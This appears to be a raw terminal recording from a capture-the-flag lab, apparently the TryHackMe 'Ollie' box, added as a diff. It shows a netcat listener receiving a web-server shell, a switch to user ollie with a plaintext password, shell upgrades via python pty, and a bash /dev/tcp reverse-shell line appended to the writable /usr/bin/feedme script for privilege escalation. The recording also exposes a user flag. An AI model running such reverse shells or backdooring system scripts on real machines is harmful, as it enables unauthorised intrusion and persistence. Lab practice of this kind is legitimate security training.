@@ -1,0 +1,94 @@
+Script started on 2026-09-23 16:19:19+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="119" LINES="29"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.24.65.71] from (UNKNOWN) [172.24.64.1] 59717
+sh: 0: can't access tty; job control turned off
+$ [K$ [K[?2004h$ id[?2004l[C[C[K[?2004hid
+[Kuid=33(www-data) gid=33(www-data) groups=33(www-data)
+[K$ [K$ [K[?2004h$ su ollie[C[C[?2004l[C[C[K[?2004hsu ollie
+[KPassword: [KPassword: [K[?2004hPassword: [7mOllieUnixMontgomery![27m[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hOllieUnixMontgomery!
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=1000(ollie) gid=1000(ollie) groups=1000(ollie),4(adm),24(cdrom),30(dip),46(plugdev)
+[K[K[?2004hcd[?2004l[K[?2004hcd
+[K[K[?2004hls[?2004l[K[?2004hls
+[Kuser.txt
+[K[K[?2004hcat user.txrtr[K[K[Kt[?2004l[K[?2004hcat user.txt
+[KTHM{Ollie_boi_is_daH_Cut3st}
+[K[K[?2004h[7mvim /usr/bin/feedme[27m[?2004l[K[?2004hvim /usr/bin/feedme
+[KVim: Warning: Output is not to a terminal
+Vim: Warning: Input is not from a terminal
+[K[m[m[0m[H[2J[24;1H"/usr/bin/feedme" 3L, 30C[K[m[m[0m[H[2J[24;1H"/usr/bin/feedme" 3L, 30C[K[m[m[0m[H[2J[24;1H"/usr/bin/feedme" 3L, 30C[1;1H[34m#!/bin/bash
+
+# This is weird?[0m
+[1m[34m~                                                                               [5;1H~                                                                               [6;1H~                                                                               [7;1H~                                                                               [8;1H~                                                                               [9;1H~                                                                               [10;1H~                                                                               [11;1H~                                                                               [12;1H~                                                                               [13;1H~                                                                               [14;1H~                                                                               [15;1H~                                                                               [16;1H~                                                                               [17;1H~                                                                               [18;1H~                                                                               [19;1H~                                                                               [20;1H~                                                                               [21;1H~                                                                               [22;1H~                                                                               [23;1H~                                                                               [0m[24;63H1,1[11CAll[1;1H[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[1m[34m~                                                                               [5;1H~                                                                               [6;1H~                                                                               [7;1H~                                                                               [8;1H~                                                                               [9;1H~                                                                               [10;1H~                                                                               [11;1H~                                                                               [12;1H~                                                                               [13;1H~                                                                               [14;1H~                                                                               [15;1H~                                                                               [16;1H~                                                                               [17;1H~                                                                               [18;1H~                                                                               [19;1H~                                                                               [20;1H~                                                                               [21;1H~                                                                               [22;1H~                                                                               [23;1H~                                                                               [0m[24;63H1,1[11CAll[1;1H[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[?2004h[1m[34m~                                                                               [5;1H~                                     
+                                          [6;1H~                                                                           
+    [7;1H~                                                                               [8;1H~                                
+                                               [9;1H~                                                                      
+         [10;1H~                                                                               [11;1H~                           
+                                                    [12;1H~                                                                 
+              [13;1H~                                                                               [14;1H~                      
+                                                         [15;1H~                                                            
+                   [16;1H~                                                                               [17;1H~                 
+                                                              [18;1H~                                                       
+                        [19;1H~                                                                               [20;1H~            
+                                                                   [21;1H~                                                  
+                             [22;1H~                                                                               [23;1H~       
+                                                                        [0m[24;63H1,1[11CAll[1;1H[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[CZZ[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hZZ
+[K[24;1H[24;1H[K[24;1H[K[24;1H[24;1H[K[24;1H[K[?2004h[24;1H[24;1H[K[24;1H[7mpython -c 'import socket,subprocess,os,pty;pty.spawn("/bin/sh")'[27m[C[C[C[Cpython -c 'import socket,subprocess,os,pty;pty.spawn("/bin/sh")'[C[C[C[C'[K[?2004l[C[C[C[C[K[?2004h'
+[K[K[?2004h[7mpython -c 'import pty;pty.spawn("/bin/bash")'[27m[?2004l[K[?2004hpython -c 'import pty;pty.spawn("/bin/bash")'
+[Kbash: line 7: syntax error near unexpected token `"/bin/bash"'
+bash: line 7: `python -c 'import pty;pty.spawn("/bin/bash")''
+[K$ [K$ [K[?2004h$ ls[?2004l[C[C[K[?2004hls
+[KINSTALL.txt
+README.md
+UPDATE
+api
+app
+config.docker.php
+config.php
+css
+db
+functions
+imgs
+immaolllieeboyyy
+index.php
+install
+js
+misc
+robots.txt
+shell.php
+upgrade
+[K$ [K$ [K[?2004h$ whoami[C[C[?2004l[C[C[K[?2004hwhoami
+[Kwww-data
+[K$ [K$ [K[?2004h$ su ollie[C[C[?2004l[C[C[K[?2004hsu ollie
+[KPassword: [KPassword: [K[?2004hPassword: [7mOllieUnixMontgomery![27m[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hOllieUnixMontgomery!
+[K[K[?2004h[7mpython -c 'import pty;pty.spawn("/bin/bash")'[27m[?2004l[K[?2004hpython -c 'import pty;pty.spawn("/bin/bash")'
+[Kbash: line 1: python: command not found
+[K[K[?2004hpython3 --version[?2004l[K[?2004hpython3 --version
+[KPython 3.8.10
+[K[K[?2004h[7mpython3 -c 'import pty;pty.spawn("/bin/bash")'[27m[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[Kollie@ip-10-80-144-31:/var/www/html$ [Kollie@ip-10-80-144-31:/var/www/html$ [K[?2004hollie@ip-10-80-144-31:/var/www/html$ cd[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd
+[Kcd
+ollie@ip-10-80-144-31:~$ [Kollie@ip-10-80-144-31:~$ [K[?2004hollie@ip-10-80-144-31:~$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+user.txt
+ollie@ip-10-80-144-31:~$ [Kollie@ip-10-80-144-31:~$ [K[?2004hollie@ip-10-80-144-31:~$ cat /usr.bin[K[K[K[K/bin/feedme[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat /usr/bin/feedme
+[Kcat /usr/bin/feedme
+#!/bin/bash
+
+# This is weird?
+ollie@ip-10-80-144-31:~$ [Kollie@ip-10-80-144-31:~$ [K[?2004hollie@ip-10-80-144-31:~$ echo "[7m/bin/bash -i >& /dev/tcp/192.168.131.92/1337 0>&1[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/bin/bash -i >& /dev/tcp/192.168.131.92/1337 0>&1" //[K[K>> /usr/bin/feedme[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hecho "/bin/bash -i >& /dev/tcp/192.168.131.92/1337 0>&1" >> /usr/bin/feedme
+[K<ev/tcp/192.168.131.92/1337 0>&1" >> /usr/bin/feedme
+[Kollie@ip-10-80-144-31:~$ [Kollie@ip-10-80-144-31:~$ [K[?2004hollie@ip-10-80-144-31:~$ echo "/bin/bash -i >& /dev/tcp/192.168.131.92/1337 0>&1" >> /usr/bin/feedme[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat /usr/bin/feedme[K[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat /usr/bin/feedme
+[Kcat /usr/bin/feedme
+#!/bin/bash
+
+# This is weird?
+/bin/bash -i >& /dev/tcp/192.168.131.92/1337 0>&1
+ollie@ip-10-80-144-31:~$ [Kollie@ip-10-80-144-31:~$ [K[?2004hollie@ip-10-80-144-31:~$ exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[K$ [K$ [K[?2004h$ exit[C[C[?2004l[C[C[K[?2004hexit
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[K[?2004l
+Script done on 2026-09-23 16:30:16+03:00 [COMMAND_EXIT_CODE="0"]
